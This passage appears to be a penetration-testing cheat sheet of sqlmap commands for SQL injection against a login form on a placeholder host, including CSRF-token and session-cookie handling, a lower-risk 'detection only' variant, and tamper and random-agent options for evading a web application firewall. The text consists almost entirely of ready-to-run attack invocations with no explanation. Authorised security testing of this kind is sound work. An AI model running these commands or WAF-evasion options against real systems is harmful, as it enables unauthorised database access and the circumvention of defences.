
--technique=BEUSTQ


```bash

sqlmap -u "https://target.com/login" \
--data="username=test&password=test123&csrf_token=XYZ" \
--csrf-token=csrf_token \
--cookie="PHPSESSID=abc123" \
-p username \
--string="Dashboard" \
--level=3 --risk=2 \
--batch

```


for detection only


```bash

sqlmap \
-u "https://target.com/login" \
--data="username=test&password=test123&csrf=XYZ" \
--csrf-token=csrf \
-p username \
--string="Dashboard" \
--level=2 \
--risk=1 \
--technique=BEUSTQ \
--smart \
--batch
```

if waf is present

```bash

--tamper=space2comment
or 
--random-agent
```